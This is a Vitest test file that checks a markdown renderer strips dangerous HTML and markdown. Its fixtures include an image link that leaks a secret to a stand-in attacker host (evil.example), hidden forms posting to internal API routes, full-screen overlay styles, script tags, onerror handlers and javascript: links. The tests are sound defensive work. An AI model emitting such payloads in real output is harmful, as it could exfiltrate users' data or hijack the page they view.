// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './markdown';

// The sanitiser needs a DOM, so this file alone runs in one.
const dom = (markdown: string): HTMLElement => {
  const host = document.createElement('div');
  host.innerHTML = renderMarkdown(markdown);
  return host;
};

describe('renderMarkdown', () => {
  it('drops a form and every control in it, keeping the words', () => {
    const host = dom(
      '<form action="/api/models/download" method="post" enctype="text/plain">' +
        '<input name=\'{"id":"big","x":"\' value=\'"}\'>' +
        '<textarea name="t">body</textarea><select name="s"><option>one</option></select>' +
        '<button formaction="/api/session/load">Continue</button></form>',
    );
    expect(host.querySelector('form, input, button, textarea, select, option')).toBeNull();
    expect(host.innerHTML).not.toMatch(/action|enctype|\/api\//);
    expect(host.textContent).toContain('Continue');
  });

  it('drops controls written outside a form', () => {
    const host = dom('Click <button formaction="/api/cancel" form="f">here</button> <input form="f" value="x">');
    expect(host.querySelector('button, input')).toBeNull();
    expect(host.innerHTML).not.toContain('formaction');
  });

  it('drops style blocks and style attributes', () => {
    const host = dom(
      '<style>body { display: none }</style>\n\n<div style="position:fixed;inset:0">over</div>\n\n<a href="https://e.org" style="position:fixed">l</a>',
    );
    expect(host.querySelector('style')).toBeNull();
    expect(host.querySelector('[style]')).toBeNull();
    expect(host.innerHTML).not.toContain('display: none');
    expect(host.textContent).toContain('over');
  });

  it('still stops scripts and handlers', () => {
    const host = dom('<script>alert(1)</script><img src="x" onerror="alert(1)"><a href="javascript:alert(1)">x</a>');
    expect(host.querySelector('script')).toBeNull();
    expect(host.innerHTML).not.toMatch(/onerror|javascript:/);
  });

  it('fetches no image: a remote or same-origin one becomes its alt text', () => {
    for (const md of [
      '![secret: 42](https://evil.example/leak?d=42 "t")',
      '![plan](/api/plan?measure=1)',
      '<img src="https://evil.example/x.png" alt="secret: 42" srcset="https://evil.example/y.png 2x">',
      '<img src="//evil.example/x.png" alt="secret: 42">',
    ]) {
      const host = dom(md);
      expect(host.querySelector('img')).toBeNull();
      expect(host.innerHTML).not.toMatch(/evil\.example|\/api\//);
      expect(host.textContent).toContain(md.includes('plan') ? 'plan' : 'secret: 42');
    }
  });

  it('sanitises what follows a replaced image as before', () => {
    const host = dom(
      '<img src="https://e.example/a.png" alt="a"><img src="https://e.example/b.png" onerror="alert(1)">' +
        '<script>alert(1)</script><a href="javascript:alert(1)" style="x">l</a><form><input></form>',
    );
    expect(host.querySelector('img, script, form, input, [style]')).toBeNull();
    expect(host.innerHTML).not.toMatch(/onerror|javascript:|e\.example/);
  });

  it('keeps an image whose bytes are inline', () => {
    const src = 'data:image/png;base64,iVBORw0KGgo=';
    const img = dom(`![dot](${src})`).querySelector('img')!;
    expect(img.getAttribute('src')).toBe(src);
    expect(img.getAttribute('alt')).toBe('dot');
    expect(dom('<img src="data:image/svg+xml;base64,PHN2Zz4=" alt="s">').querySelector('img')).toBeNull();
  });

  it('drops media and their sources, which fetch like images', () => {
    const host = dom(
      '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>' +
        '<audio src="https://evil.example/a.mp3"></audio>' +
        '<picture><source srcset="https://evil.example/s.png"></picture>' +
        '<table background="https://evil.example/b.png"><tr><td>x</td></tr></table>',
    );
    expect(host.querySelector('video, audio, picture, source')).toBeNull();
    expect(host.innerHTML).not.toContain('evil.example');
  });

  it('opens links outside the app, without the opener', () => {
    const a = dom('[site](https://example.org/a?b=1)').querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://example.org/a?b=1');
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    expect(a.textContent).toBe('site');
  });

  it('renders ordinary markdown as before', () => {
    expect(renderMarkdown('**bold** and *em* and `code`')).toBe(
      '<p><strong>bold</strong> and <em>em</em> and <code>code</code></p>\n',
    );
    expect(renderMarkdown('```js\nconst a = "<b>";\n```')).toBe(
      '<pre><code class="language-js">const a = "&lt;b&gt;";\n</code></pre>\n',
    );
    const list = dom('- one\n- two\n\n1. first\n2. second');
    expect([...list.querySelectorAll('ul > li')].map((li) => li.textContent)).toEqual(['one', 'two']);
    expect([...list.querySelectorAll('ol > li')].map((li) => li.textContent)).toEqual(['first', 'second']);
    const table = dom('| a | b |\n|---|---|\n| 1 | 2 |');
    expect([...table.querySelectorAll('thead th')].map((c) => c.textContent)).toEqual(['a', 'b']);
    expect([...table.querySelectorAll('tbody td')].map((c) => c.textContent)).toEqual(['1', '2']);
    expect(dom('# Title\n\n> quote\n\nline one\nline two').innerHTML).toBe(
      '<h1>Title</h1>\n<blockquote>\n<p>quote</p>\n</blockquote>\n<p>line one<br>line two</p>\n',
    );
  });
});
